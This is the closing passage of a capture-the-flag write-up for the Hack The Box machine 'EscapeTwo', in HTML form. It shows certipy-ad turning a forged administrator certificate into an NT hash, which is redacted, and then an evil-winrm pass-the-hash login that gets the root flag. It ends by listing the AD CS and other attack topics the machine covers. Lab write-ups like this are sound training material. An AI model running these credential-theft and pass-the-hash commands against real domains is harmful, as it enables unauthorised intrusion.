&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found multiple identifications in certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Please &lt;span class="k">select&lt;/span> one:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span> UPN: &lt;span class="s1">&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span> DNS Host Name: &lt;span class="s1">&amp;#39;10.10.11.51&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using principal: administrator@sequel.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get TGT...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved credential cache to &lt;span class="s1">&amp;#39;administrator.ccache&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to retrieve NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span>: xxxxxx:xxxx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Login as Admin and you got the root flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.51 -u &lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;xxxxxxx&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/18.png"
width="488"
height="213"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/18_hu_e8242c726659c9d2.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/18_hu_467f085c1eb2fde7.png 1024w"
loading="lazy"
alt="Admin Flag"
class="gallery-image"
data-flex-grow="229"
data-flex-basis="549px"
>&lt;/p>
&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>This machine covers topics like SMB shares leaks, MSSQL RCE, ESC4 Certificate Attack, Shadow Credentials Attack, weak ACLs and AD CS misconfigurations&lt;/p>
&lt;p>&lt;mark>Hope you enjoy it and Happy Hacking!&lt;/mark>&lt;/p></description></item></channel></rss>